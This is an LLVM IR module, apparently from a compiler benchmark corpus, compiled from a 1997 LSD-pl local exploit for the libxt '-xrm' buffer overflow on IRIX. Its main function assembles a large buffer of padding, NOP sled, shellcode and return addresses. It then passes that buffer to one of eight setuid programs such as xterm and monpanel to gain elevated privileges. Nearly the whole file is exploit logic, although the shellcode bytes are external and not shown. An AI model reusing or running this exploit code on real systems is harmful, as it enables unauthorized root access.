; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19200.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19200.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM jan 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [62 x i8] c"libxt.so -xrm for irix 5.2 5.3 6.2 6.3 IP:17,19,20,21,22,32\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [74 x i8] c"usage: %s {monpanel|printers|dmplay|datman|xwsh|cdplayer|xconsole|xterm}\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"monpanel\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"printers\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"dmplay\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"datman\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"xwsh\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"cdplayer\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"xconsole\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"xterm\00", align 1
@jump = common dso_local global i64 0, align 8
@ALLIGN = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@TMPNUM = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [19 x i8] c"/usr/sbin/monpanel\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"-xrm\00", align 1
@.str.14 = private unnamed_addr constant [19 x i8] c"/usr/sbin/printers\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"/usr/sbin/dmplay\00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"/usr/sbin/datman\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"/usr/sbin/xwsh\00", align 1
@.str.18 = private unnamed_addr constant [22 x i8] c"/usr/bin/X11/cdplayer\00", align 1
@.str.19 = private unnamed_addr constant [22 x i8] c"/usr/bin/X11/xconsole\00", align 1
@.str.20 = private unnamed_addr constant [19 x i8] c"/usr/bin/X11/xterm\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [20000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %12, align 4
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

29:                                               ; preds = %23
  store i32 0, i32* %12, align 4
  br label %30

30:                                               ; preds = %29, %23
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

36:                                               ; preds = %30
  store i32 1, i32* %12, align 4
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %37
  store i32 2, i32* %12, align 4
  br label %44

44:                                               ; preds = %43, %37
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %44
  store i32 3, i32* %12, align 4
  br label %51

51:                                               ; preds = %50, %44
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

57:                                               ; preds = %51
  store i32 4, i32* %12, align 4
  br label %58

58:                                               ; preds = %57, %51
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* %61, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0))
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

64:                                               ; preds = %58
  store i32 5, i32* %12, align 4
  br label %65

65:                                               ; preds = %64, %58
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0))
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %72, label %71

71:                                               ; preds = %65
  store i32 6, i32* %12, align 4
  br label %72

72:                                               ; preds = %71, %65
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %79, label %78

78:                                               ; preds = %72
  store i32 7, i32* %12, align 4
  br label %79

79:                                               ; preds = %78, %72
  %80 = load i32, i32* %12, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %84

82:                                               ; preds = %79
  %83 = call i32 @exit(i32 -1) #3
  unreachable

84:                                               ; preds = %79
  %85 = load i64, i64* @jump, align 8
  %86 = inttoptr i64 %85 to i64 (...)*
  %87 = call i64 (...) %86()
  %88 = add i64 %87, 15000
  %89 = add i64 %88, 8000
  %90 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %91 = bitcast i8* %90 to i64*
  store i64 %89, i64* %91, align 1
  %92 = load i64, i64* @jump, align 8
  %93 = inttoptr i64 %92 to i64 (...)*
  %94 = call i64 (...) %93()
  %95 = add i64 %94, 15000
  %96 = add i64 %95, 15300
  %97 = add i64 %96, 1000
  %98 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %99 = bitcast i8* %98 to i64*
  store i64 %97, i64* %99, align 1
  %100 = load i64, i64* @jump, align 8
  %101 = inttoptr i64 %100 to i64 (...)*
  %102 = call i64 (...) %101()
  %103 = add i64 %102, 15000
  %104 = add i64 %103, 15300
  %105 = add i64 %104, 1000
  %106 = add i64 %105, 2000
  %107 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %108 = bitcast i8* %107 to i64*
  store i64 %106, i64* %108, align 1
  %109 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  store i8* %109, i8** %10, align 8
  store i32 0, i32* %11, align 4
  br label %110

110:                                              ; preds = %117, %84
  %111 = load i32, i32* %11, align 4
  %112 = load i32, i32* @ALLIGN, align 4
  %113 = icmp slt i32 %111, %112
  br i1 %113, label %114, label %120

114:                                              ; preds = %110
  %115 = load i8*, i8** %10, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %10, align 8
  store i8 -1, i8* %115, align 1
  br label %117

117:                                              ; preds = %114
  %118 = load i32, i32* %11, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %11, align 4
  br label %110

120:                                              ; preds = %110
  store i32 0, i32* %11, align 4
  br label %121

121:                                              ; preds = %135, %120
  %122 = load i32, i32* %11, align 4
  %123 = load i32, i32* @NOPNUM, align 4
  %124 = icmp slt i32 %122, %123
  br i1 %124, label %125, label %138

125:                                              ; preds = %121
  %126 = load i32*, i32** @nop, align 8
  %127 = load i32, i32* %11, align 4
  %128 = srem i32 %127, 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %126, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = trunc i32 %131 to i8
  %133 = load i8*, i8** %10, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %10, align 8
  store i8 %132, i8* %133, align 1
  br label %135

135:                                              ; preds = %125
  %136 = load i32, i32* %11, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %11, align 4
  br label %121

138:                                              ; preds = %121
  store i32 0, i32* %11, align 4
  br label %139

139:                                              ; preds = %153, %138
  %140 = load i32, i32* %11, align 4
  %141 = load i32*, i32** @shellcode, align 8
  %142 = call i32 @strlen(i32* %141)
  %143 = icmp slt i32 %140, %142
  br i1 %143, label %144, label %156

144:                                              ; preds = %139
  %145 = load i32*, i32** @shellcode, align 8
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = trunc i32 %149 to i8
  %151 = load i8*, i8** %10, align 8
  %152 = getelementptr inbounds i8, i8* %151, i32 1
  store i8* %152, i8** %10, align 8
  store i8 %150, i8* %151, align 1
  br label %153

153:                                              ; preds = %144
  %154 = load i32, i32* %11, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %11, align 4
  br label %139

156:                                              ; preds = %139
  %157 = load i8*, i8** %10, align 8
  %158 = getelementptr inbounds i8, i8* %157, i32 1
  store i8* %158, i8** %10, align 8
  store i8 -1, i8* %157, align 1
  %159 = load i8*, i8** %10, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %10, align 8
  store i8 -1, i8* %159, align 1
  store i32 0, i32* %11, align 4
  br label %161

161:                                              ; preds = %173, %156
  %162 = load i32, i32* %11, align 4
  %163 = load i32, i32* @TMPNUM, align 4
  %164 = icmp slt i32 %162, %163
  br i1 %164, label %165, label %176

165:                                              ; preds = %161
  %166 = load i32, i32* %11, align 4
  %167 = srem i32 %166, 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = load i8*, i8** %10, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %10, align 8
  store i8 %170, i8* %171, align 1
  br label %173

173:                                              ; preds = %165
  %174 = load i32, i32* %11, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %11, align 4
  br label %161

176:                                              ; preds = %161
  store i32 0, i32* %11, align 4
  br label %177

177:                                              ; preds = %184, %176
  %178 = load i32, i32* %11, align 4
  %179 = load i32, i32* @ALLIGN, align 4
  %180 = icmp slt i32 %178, %179
  br i1 %180, label %181, label %187

181:                                              ; preds = %177
  %182 = load i8*, i8** %10, align 8
  %183 = getelementptr inbounds i8, i8* %182, i32 1
  store i8* %183, i8** %10, align 8
  store i8 -1, i8* %182, align 1
  br label %184

184:                                              ; preds = %181
  %185 = load i32, i32* %11, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %11, align 4
  br label %177

187:                                              ; preds = %177
  store i32 0, i32* %11, align 4
  br label %188

188:                                              ; preds = %200, %187
  %189 = load i32, i32* %11, align 4
  %190 = load i32, i32* @PCHNUM, align 4
  %191 = icmp slt i32 %189, %190
  br i1 %191, label %192, label %203

192:                                              ; preds = %188
  %193 = load i32, i32* %11, align 4
  %194 = srem i32 %193, 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %195
  %197 = load i8, i8* %196, align 1
  %198 = load i8*, i8** %10, align 8
  %199 = getelementptr inbounds i8, i8* %198, i32 1
  store i8* %199, i8** %10, align 8
  store i8 %197, i8* %198, align 1
  br label %200

200:                                              ; preds = %192
  %201 = load i32, i32* %11, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %11, align 4
  br label %188

203:                                              ; preds = %188
  store i32 0, i32* %11, align 4
  br label %204

204:                                              ; preds = %216, %203
  %205 = load i32, i32* %11, align 4
  %206 = load i32, i32* @ADRNUM, align 4
  %207 = icmp slt i32 %205, %206
  br i1 %207, label %208, label %219

208:                                              ; preds = %204
  %209 = load i32, i32* %11, align 4
  %210 = srem i32 %209, 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %211
  %213 = load i8, i8* %212, align 1
  %214 = load i8*, i8** %10, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %10, align 8
  store i8 %213, i8* %214, align 1
  br label %216

216:                                              ; preds = %208
  %217 = load i32, i32* %11, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %11, align 4
  br label %204

219:                                              ; preds = %204
  %220 = load i8*, i8** %10, align 8
  store i8 0, i8* %220, align 1
  %221 = load i32, i32* %12, align 4
  switch i32 %221, label %246 [
    i32 0, label %222
    i32 1, label %225
    i32 2, label %228
    i32 3, label %231
    i32 4, label %234
    i32 5, label %237
    i32 6, label %240
    i32 7, label %243
  ]

222:                                              ; preds = %219
  %223 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %224 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %223, i32 0)
  br label %225

225:                                              ; preds = %219, %222
  %226 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %227 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %226, i32 0)
  br label %228

228:                                              ; preds = %219, %225
  %229 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %230 = call i32 @execl(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %229, i32 0)
  br label %231

231:                                              ; preds = %219, %228
  %232 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %233 = call i32 @execl(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %232, i32 0)
  br label %234

234:                                              ; preds = %219, %231
  %235 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %236 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %235, i32 0)
  br label %237

237:                                              ; preds = %219, %234
  %238 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %239 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %238, i32 0)
  br label %240

240:                                              ; preds = %219, %237
  %241 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %242 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %241, i32 0)
  br label %243

243:                                              ; preds = %219, %240
  %244 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %245 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0), i8* %244, i32 0)
  br label %246

246:                                              ; preds = %243, %219
  %247 = load i32, i32* %3, align 4
  ret i32 %247
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
